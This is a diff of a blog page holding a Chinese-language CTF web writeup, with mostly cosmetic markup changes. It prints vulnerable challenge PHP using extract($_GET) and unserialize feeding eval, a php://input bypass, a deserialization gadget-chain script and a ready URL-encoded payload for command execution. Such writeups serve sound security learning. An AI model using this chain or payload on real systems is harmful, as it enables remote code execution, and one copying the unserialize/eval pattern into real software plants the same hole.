@@ -58,20 +58,20 @@
         <header>
     <nav class="navbar">
         <div class="container">
-            <div class="navbar-header header-logo"><a href="/">Lethe&#39;s Blog</a></div>
+            <div class="navbar-header header-logo"><font face="Comic Sans MS"><a href="/">Lethe&#39;s Blog</a></font></div>
             <div class="menu navbar-right">
                 
-                    <a class="menu-item" href="/archives">Posts</a>
+                    <font face="Comic Sans MS"><a class="menu-item" href="/archives">Posts</a>
                 
-                    <a class="menu-item" href="/category">Categories</a>
+                    <font face="Comic Sans MS"><a class="menu-item" href="/category">Categories</a>
                 
-                    <a class="menu-item" href="/tag">Tags</a>
+                    <font face="Comic Sans MS"><a class="menu-item" href="/tag">Tags</a>
                 
-                    <a class="menu-item" href="/about">About</a>
+                    <font face="Comic Sans MS"><a class="menu-item" href="/about">About</a>
                 
                 <input id="switch_default" type="checkbox" class="switch_default">
                 <label for="switch_default" class="toggleBtn"></label>
-            </div>
+            </font></font></font></font></div>
         </div>
     </nav>
 
@@ -80,7 +80,7 @@
         <div class="container">
             <div class="navbar-header">
                 <div>
-                    <b><a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a></b>
+                    <a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                 </div>
                 <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
             </div>
@@ -188,12 +188,12 @@
             
                 <div class="post-meta">
                     
-                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
+                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>&ensp;
                     
 
                     
                         <span class="post-time">
-                        Date: <a href="#">September 1, 2019&nbsp;&nbsp;16:33:24</a>
+                        Date: <a href="#">September 1, 2019&nbsp;&nbsp;16:33:24</a>&ensp;
                         </span>
                     
                     
@@ -242,27 +242,7 @@
 <p>（3）于是访问 xxx/.151912db206ee052.php.swp下载文件，并通过命令<code>vi –r [文件名]</code>进行恢复。</p>
 <p><img src="/2019/09/01/第五空间Writeup-Web/20190903161215948.png" alt="在这里插入图片描述"></p>
 <p>（4）审计代码如下：</p>
-<pre><code class="php">&lt;?php  
-error_reporting(0);  
-class First{  
-  function firstlevel(){  
-        $a=&#39;whoami&#39;;  
-        extract($_GET);  
-        $fname = $_GET[&#39;fname&#39;]?$_GET[&#39;fname&#39;]:&#39;./js/ctf.js&#39;;  
-        $content=trim(file_get_contents($fname));  
-        if($a==$content)  
-        {  
-                echo &#39;ok&#39;;;  
-        else  
-        {  
-                echo &#39;听说你的Linux用的很6？&#39;;  
-        }  
-  }  
-}  
-$execfirst = new First();  
-$execfirst -&gt; firstlevel();  
-?&gt;
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">First</span></span>&#123;  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">firstlevel</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        $a=<span class="string">'whoami'</span>;  </span><br><span class="line">        extract($_GET);  </span><br><span class="line">        $fname = $_GET[<span class="string">'fname'</span>]?$_GET[<span class="string">'fname'</span>]:<span class="string">'./js/ctf.js'</span>;  </span><br><span class="line">        $content=trim(file_get_contents($fname));  </span><br><span class="line">        <span class="keyword">if</span>($a==$content)  </span><br><span class="line">        &#123;  </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'ok'</span>;;  </span><br><span class="line">        <span class="keyword">else</span>  </span><br><span class="line">        &#123;  </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'听说你的Linux用的很6？'</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$execfirst = <span class="keyword">new</span> First();  </span><br><span class="line">$execfirst -&gt; firstlevel();  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li><p>利用方式一：PHP伪协议——php://input，所以构造：<code>?fname=php://input</code>，并POST数据：<code>whoami</code></p>
 </li>
@@ -279,117 +259,17 @@ $execfirst -&gt; firstlevel();
 <p><br></p>
 <h1 id="八苦"><a href="#八苦" class="headerlink" title="八苦"></a>八苦</h1><p>这一题下午的时候坏了，一直到最后都没修复好…</p>
 <p>（1）进入后发现页面上，只有一个welcome，最后扫描发现是<code>.phps</code>上有源码如下：</p>
-<pre><code class="php">&lt;?php
-
-    // flag.php in /var/html/www
-
-    error_reporting(0);
-    class Test{
-        protected $careful;
-        public $securuty;
-        public function __wakeup(){
-            if($this-&gt;careful===1){
-                phpinfo();    // step 1:    read source,get phpinfo and read it carefullt
-            }
-        }
-        public function __get($name){
-            return $this-&gt;securuty[$name];
-        }
-        public function __call($param1,$param2){
-            if($this-&gt;{$param1}){
-                eval(&#39;$a=&#39;.$_GET[&#39;dangerous&#39;].&#39;;&#39;);
-            }
-        }
-    }
-    class User{
-        public $user;
-        public function __wakeup(){
-            $this-&gt;user=new Welcome();
-            $this-&gt;user-&gt;say_hello();  
-        }
-    }
-    $a=serialize(new User);
-    $string=$_GET[&#39;foo&#39;]??$a;
-    unserialize($string);
-?&gt;
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// flag.php in /var/html/www</span></span><br><span class="line"></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> $careful;</span><br><span class="line">        <span class="keyword">public</span> $securuty;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;careful===<span class="number">1</span>)&#123;</span><br><span class="line">				phpinfo();	<span class="comment">// step 1:	read source,get phpinfo and read it carefullt</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;securuty[$name];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($param1,$param2)</span></span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$param1&#125;)&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="string">'$a='</span>.$_GET[<span class="string">'dangerous'</span>].<span class="string">';'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $user;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;user=<span class="keyword">new</span> Welcome();</span><br><span class="line">			<span class="keyword">$this</span>-&gt;user-&gt;say_hello();  </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$a=serialize(<span class="keyword">new</span> User);</span><br><span class="line">	$string=$_GET[<span class="string">'foo'</span>]??$a;</span><br><span class="line">	unserialize($string);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>（2）看样子是一道反序列化的题目了，注释中提示了先仔细看phpinfo的内容，于是想办法先执行phpinfo()。</p>
 <p>可以看到，这段代码里没有文件包含，也没有定义Welcome类，但是却在User类里实例化了Welcome类，所以应该是phpinfo中隐藏了信息。</p>
 <p>所以，看phpinfo的脚本如下：</p>
-<pre><code class="php">&lt;?php
-    class Test{
-        protected $careful;
-        public function __construct()
-        {
-            $this-&gt;careful = 1;
-        }
-    }
-    $a=new Test;
-    echo urlencode(serialize($a));
-?&gt;
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> $careful;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;careful = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$a=<span class="keyword">new</span> Test;</span><br><span class="line">	<span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>（3）然后经过一系列操作得到第二段代码，如下：</p>
-<pre><code class="php">&lt;?php
-class Welcome{
-    public function say_hello(){
-        echo &quot;welcome&lt;br&gt;&quot;;
-    }
-}
-class Welcome_again{
-    public $willing ;
-    public $action ;  //action=new Test;
-    public function __construct(){
-        $this-&gt;action=new Welcome;
-    }
-    public function __destruct(){
-        if($this-&gt;willing){
-            $this-&gt;action-&gt;say_hello();
-        }
-    }
-}
-?&gt;
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"welcome&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome_again</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $willing ;</span><br><span class="line">    <span class="keyword">public</span> $action ;  <span class="comment">//action=new Test;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;action=<span class="keyword">new</span> Welcome;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;willing)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;action-&gt;say_hello();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>整个利用过程，和QWB2019的upload那一题差不多，</p>
-<pre><code>Welcome_again =&gt; ___destruct
-Test =&gt; __call
-Test =&gt; __get
-eval()
-</code></pre><p>脚本如下：</p>
-<pre><code class="php">&lt;?php
-    class Welcome_again{
-        public $willing ;
-        public $action ;  
-        public function __construct(){
-            $this-&gt;action = new Test();
-            $this-&gt;willing = 1;             //过if判断
-        }
-        public function __destruct(){
-            if($this-&gt;willing){
-                $this-&gt;action-&gt;say_hello(); //调用Test::__call
-            }
-        }
-    }
-    class Test{
-        protected $careful;
-        public $securuty;
-        public function __construct()
-        {
-            $this-&gt;securuty = [&#39;say_hello&#39; =&gt; 1];   
-            $this-&gt;careful = 0;                
-        }
-        public function __get($name){
-            return $this-&gt;securuty[$name];        //返回1
-        }
-        public function __call($param1,$param2){  //param1=say_hello
-            if($this-&gt;{$param1}){                 //调用Test::__get
-                //eval(&#39;$a=&#39;.$_GET[&#39;dangerous&#39;].&#39;;&#39;);
-            }
-        }
-    }
-    $a = new Welcome_again();
-    echo urlencode(serialize($a));
-?&gt;
-</code></pre>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Welcome_again =&gt; ___destruct</span><br><span class="line"><span class="keyword">Test </span>=&gt; __call</span><br><span class="line"><span class="keyword">Test </span>=&gt; __get</span><br><span class="line">eval()</span><br></pre></td></tr></table></figure>
+<p>脚本如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Welcome_again</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $willing ;</span><br><span class="line">        <span class="keyword">public</span> $action ;  </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;action = <span class="keyword">new</span> Test();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;willing = <span class="number">1</span>;             <span class="comment">//过if判断</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;willing)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;action-&gt;say_hello(); <span class="comment">//调用Test::__call</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $careful;</span><br><span class="line">        <span class="keyword">public</span> $securuty;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;securuty = [<span class="string">'say_hello'</span> =&gt; <span class="number">1</span>];   </span><br><span class="line">            <span class="keyword">$this</span>-&gt;careful = <span class="number">0</span>;                </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;securuty[$name];        <span class="comment">//返回1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($param1,$param2)</span></span>&#123;  <span class="comment">//param1=say_hello</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$param1&#125;)&#123;                 <span class="comment">//调用Test::__get</span></span><br><span class="line">                <span class="comment">//eval('$a='.$_GET['dangerous'].';');</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> Welcome_again();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>得到payload:<br><code>?foo=O%3A13%3A%22Welcome_again%22%3A2%3A%7Bs%3A7%3A%22willing%22%3Bi%3A1%3Bs%3A6%3A%22action%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00careful%22%3Bi%3A0%3Bs%3A8%3A%22securuty%22%3Ba%3A1%3A%7Bs%3A9%3A%22say_hello%22%3Bi%3A1%3B%7D%7D%7D</code></p>
 <p>同时通过dangerous参数传入命令，注意要用<code>;</code>闭合前面的赋值语句。</p>
 <p>（4）最后在读flag的时候好像还要bypass open_basedir。</p>
@@ -417,14 +297,9 @@ eval()
                 
                     <p class="copyright-item">
                         <span>License:</span>
-                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                     </p>
                 
-                
-                     <p class="copyright-item">
-                         <span>Slogan:</span>
-                         <span>Do you believe in <strong>DESTINY</strong>?</span>
-                     </p>
                 
 
             </section>
